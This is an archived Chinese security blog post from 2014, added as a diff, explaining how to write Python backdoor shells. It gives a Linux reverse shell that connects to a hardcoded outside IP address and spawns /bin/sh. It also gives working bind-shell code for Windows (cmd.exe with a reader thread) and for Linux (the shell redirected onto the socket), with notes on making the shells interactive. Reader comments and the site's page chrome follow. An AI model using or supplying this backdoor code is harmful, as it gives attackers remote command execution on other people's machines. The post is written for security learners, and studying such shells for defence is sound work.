@@ -1,0 +1,694 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>python正向连接后门 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                Python &raquo; <a href="python-shell-backdoor.html">python正向连接后门</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">python正向连接后门</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/PYTHON.html">Python</a></span>
+  
+  <span class="date">时间: 2014-4-12 0:12</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">9条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="python-shell-backdoor.html">27068人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/python.html">python</a>
+    
+        <a href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+    
+        <a href="../tag/socket.html">socket</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                &nbsp; &nbsp; python在linux下的反弹shell代码我相信很多人都见过：
+<pre class="brush: python;auto-links: false;">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("59.188.234.64",14575))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);</pre>
+<p>
+	&nbsp; &nbsp; 原理很简单。新建一个socket，并将0、1、2分别代表系统的stdin、stdout、stderr（标准输入、输出、错误）重定向到socket中，然后开启一个shell。这样我们从socket中传来的命令就会进入系统的标准输入（就跟键盘输入的效果一样了），系统的输出和错误就会重定向到socket中，被我们客户端获取。但这个弹shell脚本只能在linux下使用。
+</p>
+<p>
+	&nbsp; &nbsp; 那么，本文着重讨论正向连接的shell，特别是windows下的cmdshell。
+</p>
+<p>
+	&nbsp; &nbsp; 我们唯一的要求就是交互式。举个例子，我nc连接上后，执行cd xx目录进入某目录，再执行dir能够列出该目录下文件，而不是再开启一个cmd，又列出默认目录下文件。一定要是交互式的，不能是伪交互式。
+</p>
+<p>
+	&nbsp; &nbsp; 还有一个测试方式。我们执行set a=1，再执行echo %a%，如果输出的是1，说明是交互式，否则不是交互式。
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;关于交互式正向连接shell，有几个点需要注意<br />
+<br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>1.不管在linux还是windows下，想要做到交互式，就只能开启一个shell。不能够每次接收到命令就再开启一个shell进程，然后执行，这样做的效果和os.system('命令')类似，就不用搞这么复杂了。</strong><br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>2.windows下cmd.exe /K参数是保持cmd不结束，/c参数是执行完后就结束，注意区别。</strong><br />
+<br />
+&nbsp;&nbsp;&nbsp;&nbsp;我之前的想法是，python首先新建一个socket监听端口等待连接。客户端连接上以后，就开启一个shell进程，然后把进程的标准输入输出错误（stdin、stdout、stderr）都重定向到管道中，通过管道和python程序连接，py中的subprocess库已为我们封装好了这个功能，我们不用自己再新建管道了。<br />
+&nbsp;&nbsp;&nbsp;&nbsp;然后进入一个循环，每次读取一下socket中数据，然后写入stdin中，通过管道传输给shell，shell执行完后，我用stdout.read()将结果读取到，再send给客户端。<br />
+<br />
+&nbsp;&nbsp;&nbsp;&nbsp;想法很单纯很美妙，但实践起来就出问题了。python中read不是异步的，只有读取指定字节或读取到EOF才会返回结果。如果没有EOF那么read就一直读，程序阻塞在这里，于是表现出来就是卡死了。我nc中输入dir，什么返回都没有。只要把python关掉，那边才会返回一个结果。<br />
+&nbsp;&nbsp;&nbsp;&nbsp;所以，解决思路有四：<br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>1.如果能知道shell向管道里写入了多少字节数据，我read(n)读取这个字节数据即可</strong><br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>2.如果有异步的read函数，调用也能解决问题</strong><br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>3.实在没办法，可以另开启一个线程，专门读取管道中的数据</strong><br />
+<strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong><strong>4.不使用管道，直接把shell的输入输出定向到socket中。不过在windows下使用总报错，后面再讲。</strong><br />
+<br />
+&nbsp;&nbsp;&nbsp;&nbsp;思路1、2，我是没想到好办法的。没办法知道管道内数据的大小，没找到异步read函数。<br />
+&nbsp;&nbsp;&nbsp;&nbsp;我用思路3写出了windows下的正向连接cmdshell：
+</p>
+<pre class="brush: python;auto-links: false;">from socket import *
+import subprocess
+import os, threading
+
+def send(talk, proc):
+        import time
+        while True:
+                msg = proc.stdout.readline()
+                talk.send(msg)
+
+if __name__ == "__main__":
+        server=socket(AF_INET,SOCK_STREAM)
+        server.bind(('0.0.0.0',11))
+        server.listen(5)
+        print 'waiting for connect'
+        talk, addr = server.accept()
+        print 'connect from',addr
+        proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE, 
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        t = threading.Thread(target = send, args = (talk, proc))
+        t.setDaemon(True)
+        t.start()
+        while True:
+                cmd=talk.recv(1024)
+                proc.stdin.write(cmd)
+                proc.stdin.flush()
+        server.close()</pre>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;测试可用，是交互式的：
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;<a target="_blank" href="https://www.leavesongs.com/content/uploadfile/201404/f9961397235845.jpg" id="ematt:483"><a target="_blank" href="../content/uploadfile/201404/fac41397237176.jpg" id="ematt:497"><a target="_blank" href="../content/uploadfile/201404/f9961397237156.jpg" id="ematt:491"><img src="../content/uploadfile/201404/thum-f9961397237156.jpg" title="点击查看原图" alt="03.jpg" border="0" width="650" height="207" /></a></a></a> 
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;<a target="_blank" href="https://www.leavesongs.com/content/uploadfile/201404/2de41397235847.jpg" id="ematt:485"><a target="_blank" href="../content/uploadfile/201404/2de41397237157.jpg" id="ematt:493"><img src="../content/uploadfile/201404/thum-2de41397237157.jpg" title="点击查看原图" alt="04.jpg" border="0" width="650" height="510" /></a></a> 
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;用了多线程，开启了一个新线程，这个线程专门从stdout中read数据，即使阻塞也不会影响主线程的socket过程。<br />
+<br />
+&nbsp;&nbsp;&nbsp;&nbsp;我用思路4写了一个linux版本，可以完美使用：
+</p>
+<pre class="brush: python;auto-links: false;">from socket import *
+import subprocess
+import os, threading, sys, time
+
+if __name__ == "__main__":
+        server=socket(AF_INET,SOCK_STREAM)
+        server.bind(('0.0.0.0',11))
+        server.listen(5)
+        print 'waiting for connect'
+        talk, addr = server.accept()
+        print 'connect from',addr
+        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
+                stdout=talk, stderr=talk, shell=True)</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;font-size:14px;line-height:22.390625px;white-space:normal;background-color:#FFFFFF;">效果：</span> 
+<p>
+	<br />
+</p>
+<p>
+	<a target="_blank" href="https://www.leavesongs.com/content/uploadfile/201404/13501397235848.jpg" id="ematt:487"><a target="_blank" href="../content/uploadfile/201404/13501397237159.jpg" id="ematt:495"><img src="../content/uploadfile/201404/thum-13501397237159.jpg" title="点击查看原图" alt="05.jpg" border="0" width="650" height="359" /></a></a> 
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;直接在popen的时候，将新建进程的stdin、stdout、stderr都重定向到socket中。这样就可以不使用管道通信了。这也是C语言下零管道后门的原理。<br />
+但不知道为什么，我写了一个windows版本，总是报错：
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;<a target="_blank" href="https://www.leavesongs.com/content/uploadfile/201404/fac41397235850.jpg" id="ematt:489"><a target="_blank" href="../content/uploadfile/201404/fac41397237176.jpg" id="ematt:497"><img src="../content/uploadfile/201404/fac41397237176.jpg" title="点击查看原图" alt="06.jpg" border="0" width="623" height="200" /></a></a> 
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;不太能理解，windows版本就把/bin/sh替换成cmd.exe，但就出这个错。<br />
+&nbsp;&nbsp;&nbsp;&nbsp;以上是我对python下正向连接shell的分析，希望能帮到同样有困惑的人，其中纰漏与错误，能得到大家的斧正！
+</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/python.html">python</a>
+                
+                    <a href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+                
+                    <a href="../tag/socket.html">socket</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 9 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3167">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/51cb4c0961a499c7260dc40a6e9a350d.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://blog.werner.wiki" target="_blank" rel="nofollow noopener">Werner</a></div>
+                    <p>Windows下的正向连接cmdshell中 /K 参数似乎是多余的。</p>
+                    <span class="comment-time">时间: 2018-10-16 19:07</span>
+                    <span class="comment-reply"><a href="#comment-3167" onclick="reply_to('3167','Werner')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2951">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/161d4db27bb51f07f934a082ba8ee274.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://github.com/wangyihang" target="_blank" rel="nofollow noopener">王一航</a></div>
+                    <p>推荐一款反弹 shell 的管理工具 : https://github.com/WangYihang/Reverse-Shell-Manager , 录制了一个小视频 : https://youtu.be/AoS-q1MGw30 , https://asciinema.org/a/143640</p>
+                    <span class="comment-time">时间: 2017-10-25 17:15</span>
+                    <span class="comment-reply"><a href="#comment-2951" onclick="reply_to('2951','王一航')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3008">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">只是路过</a></div>
+                    <p>@王一航 代码写的真的很丑</p>
+                    <span class="comment-time">时间: 2018-01-10 15:57</span>
+                    <span class="comment-reply"><a href="#comment-3008" onclick="reply_to('3008','只是路过')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3009">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/161d4db27bb51f07f934a082ba8ee274.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">王一航</a></div>
+                    <p>@只是路过 希望大佬指教, 能不能更具体一点呀, 向大佬虚心学习:D</p>
+                    <span class="comment-time">时间: 2018-01-10 18:38</span>
+                    <span class="comment-reply"><a href="#comment-3009" onclick="reply_to('3009','王一航')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2450">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">knight110</a></div>
+                    <p>代码 易懂，但是 还是 这样 就没有办法 输出 stderr</p>
+                    <span class="comment-time">时间: 2016-10-11 11:39</span>
+                    <span class="comment-reply"><a href="#comment-2450" onclick="reply_to('2450','knight110')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1651">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">em</a></div>
+                    <p>好棒的代码～</p>
+                    <span class="comment-time">时间: 2014-05-27 23:47</span>
+                    <span class="comment-reply"><a href="#comment-1651" onclick="reply_to('1651','em')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1606">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://dididada.dazdingo.net" target="_blank" rel="nofollow noopener">滴滴答答</a></div>
+                    <p>学弟你好~学弟再见~为何没有表情可以添加啊~orz~</p>
+                    <span class="comment-time">时间: 2014-04-16 16:41</span>
+                    <span class="comment-reply"><a href="#comment-1606" onclick="reply_to('1606','滴滴答答')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1607">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@滴滴答答：等我研究一下，加个表情进来</p>
+                    <span class="comment-time">时间: 2014-04-16 16:50</span>
+                    <span class="comment-reply"><a href="#comment-1607" onclick="reply_to('1607','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1604">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/105c85aeb120295456bab3fafd2a4e75.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://task.renwuyi.com" target="_blank" rel="nofollow noopener">悬赏任务</a></div>
+                    <p>路过留名</p>
+                    <span class="comment-time">时间: 2014-04-14 17:04</span>
+                    <span class="comment-reply"><a href="#comment-1604" onclick="reply_to('1604','悬赏任务')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="51d94f934b275d24db15ae1dee68a603013f1661" />
+</div><div class="col-6">
+<img src="../captcha/image/51d94f934b275d24db15ae1dee68a603013f1661/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="310" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="O2iC2pSC9hqcbfAVxrUca1xBlbpwfVciAAGtAutlxDEVJNojzsRX7uAGGyGHOxoA">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="../PENETRATION/javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="../PENETRATION/discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+        
+        <a rel="tag" href="../tag/iOS.html">iOS</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
+        
+        <a rel="tag" href="../tag/writeup.html">writeup</a>
+        
+        <a rel="tag" href="../tag/IIS.html">IIS</a>
+        
+        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
+        
+        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
+        
+        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
+        
+        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
+        
+        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
+        
+        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
+        
+        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
+        
+        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="../PENETRATION/detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="../PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
